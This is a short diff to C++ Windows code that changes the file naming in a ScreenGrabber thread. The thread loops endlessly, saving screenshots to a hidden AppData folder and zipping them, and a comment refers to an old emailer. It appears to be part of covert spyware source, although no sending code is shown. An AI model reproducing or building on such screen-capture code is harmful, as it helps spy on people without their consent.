@@ -718,7 +718,8 @@ ULONG WINAPI ScreenGrabber(LPVOID Parameter) {   //remove old emailer
     GetModuleFileNameA(GetModH, PathToFile, sizeof(PathToFile));
     //strcat_s(AppData, sizeof(AppData), "\\MagikGlass");
     std::string ScreenshotDir = AppData;
-    ScreenshotDir += "\\MagikGlass";
+    ScreenshotDir += "\\MagikGlass\\";
+    ScreenshotDir += std::to_string(rand() % 10000+1000);
     DWORD DWFlags;
 
     while (1) {
@@ -730,7 +731,7 @@ ULONG WINAPI ScreenGrabber(LPVOID Parameter) {   //remove old emailer
             for (int i = 0; i < ScreenshotsPerZip; i++) {
                 CurrentLog = ScreenshotDir;
                 CurrentLog += "\\ScreenShot";
-                CurrentLog += std::to_string(rand() % 10000 - 1000);
+                CurrentLog += std::to_string(rand() % 10000 + 1000);
                 CurrentLog += ".png";
 
                 TakeScreenShot(CurrentLog.c_str());
@@ -746,7 +747,7 @@ ULONG WINAPI ScreenGrabber(LPVOID Parameter) {   //remove old emailer
         }
         std::string ZipPath = ScreenshotDir;
         ZipPath += "\\Zip";
-        ZipPath += std::to_string(rand() % 10000 - 1000);
+        ZipPath += std::to_string(rand() % 10000+1000);
         ZipPath += ".zip";
 
         FILE* f = fopen(ZipPath.c_str(), "wb");
